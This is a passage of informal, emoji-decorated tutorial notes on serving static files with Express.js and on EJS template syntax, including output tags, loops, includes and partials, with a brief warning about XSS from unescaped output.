http://localhost:3000/index.html
http://localhost:3000/about.html
```

👉 Express just sends the file 📄
👉 Browser renders it 🌐

### 🔥 Important Point

👉 There is **NO `res.render()` here**

✔️ No templating
✔️ No dynamic data
✔️ Just static files

### ⚡ Default file behavior

**If `index.html` exists**

```text
http://localhost:3000/
```

👉 Automatically serves:

```text
public/index.html
```

### 🧠 How Express resolves paths

```text
URL: /about.html
↓
public/about.html
```

### 🔥 Optional: Custom route prefix

```js
app.use('/static', express.static('public'));
```

**Access**

```text
http://localhost:3000/static/index.html
```

### ⚠️ Common Mistakes

**❌ Expecting dynamic rendering**

```js
// This is WRONG expectation
express.static() → res.render()
```

👉 It doesn't inject data ❌

**❌ Wrong folder path**

```js
express.static('wrong-folder')
```

👉 404 errors 😬

### 🎯 When to use `express.static()`

✔️ HTML pages
✔️ CSS
✔️ JS files
✔️ Images

### ⚔️ Static vs Render

| Feature              | express.static | res.render |
| -------------------- | -------------- | ---------- |
| Type                 | Static         | Dynamic    |
| Uses template engine | ❌             | ✅         |
| Inject data          | ❌             | ✅         |

---

# ----EJS Template engine Rules

### 🧠 What is EJS?

👉 **EJS** =

> A template engine that lets you write **HTML + JavaScript together**

### ⚙️ Setup in **Express.js**

```js
app.set('view engine', 'ejs');
```

👉 Then:

```js
res.render('index', { name: 'Arjun' });
```

### 📁 Folder structure

```
views/
  index.ejs
```

### 🔥 CORE SYNTAX (MOST IMPORTANT)

##### 🔹 1. `<%= %>` → Output (escaped)

✅ Example

```ejs
<h1><%= name %></h1>
```

👉 Escapes HTML (safe)

🧠 Output

```html
<h1>Arjun</h1>
```

##### 🔹 2. `<%- %>` → Output (unescaped)

✅ Example

```ejs
<%- "<strong>Hello</strong>" %>
```

🧠 Output

```html
<strong>Hello</strong>
```

**⚠️ Risk**

👉 XSS if user input ❌

##### 🔹 3. `<% %>` → Logic (no output)

✅ Example

```ejs
<% if (user) { %>
  <h1>Welcome</h1>
<% } %>
```

👉 Used for:

* if
* loops
* variables

##### 🔹 4. `<%# %>` → Comment

```ejs
<%# This is a comment %>
```

👉 Not sent to browser

##### 🔹 5. `<%%` → Escape EJS tag

```ejs
<%%= name %>
```

👉 Output:

```html
<%= name %>
```

### 🔥 VARIABLES & DATA

**Passing data**

```js
res.render('index', { name: 'Arjun', age: 22 });
```

**Using in EJS**

```ejs
<p><%= name %></p>
<p><%= age %></p>
```

### 🔥 CONDITIONALS

```ejs
<% if (age > 18) { %>
  <p>Adult</p>
<% } else { %>
  <p>Minor</p>
<% } %>
```

### 🔥 LOOPS

**🔹 forEach**

```ejs
<% users.forEach(user => { %>
  <li><%= user %></li>
<% }) %>
```

**🔹 for loop**

```ejs
<% for (let i = 0; i < users.length; i++) { %>
  <li><%= users[i] %></li>
<% } %>
```

### 🔥 INCLUDE (VERY IMPORTANT)

### 📌 Reusable templates

header.ejs

```ejs
<header>Header</header>
```

index.ejs

```ejs
<%- include('header') %>
```

👉 Injects file content

**With data**

```ejs
<%- include('header', { title: 'Home' }) %>
```

### 🔥 PARTIALS (COMMON PRACTICE)

```
views/
  partials/
    header.ejs
    footer.ejs
```

```ejs
<%- include('partials/header') %>
```

### 🔥 LAYOUT (manual in EJS)

EJS doesn’t have built-in layouts like some engines
👉 You simulate using includes:

```ejs
<%- include('header') %>
<main>
  <%= content %>
</main>
<%- include('footer') %>
```

### 🔥 HTML + JS MIX

```ejs
<h1><%= user.name %></h1>

<% if (user.isAdmin) { %>
  <p>Admin Panel</p>
<% } %>
```

### 🔥 WHITESPACE CONTROL

Trim newline

```ejs
<%_ if (true) { _%>
Hello
<%_ } _%>
```

👉 Removes extra spaces/newlines

### 🔥 CUSTOM FUNCTIONS

```js
res.render('index', {
  format: (name) => name.toUpperCase()
});
```

```ejs
<p><%= format(name) %></p>
```

### ⚠️ COMMON MISTAKES

❌ Forgetting `<% %>` for logic

```ejs
if (true) { } ❌
```

❌ Using `<%- %>` for user input

👉 Security risk

❌ Wrong include path

```ejs
<%- include('/header') ❌
```

---
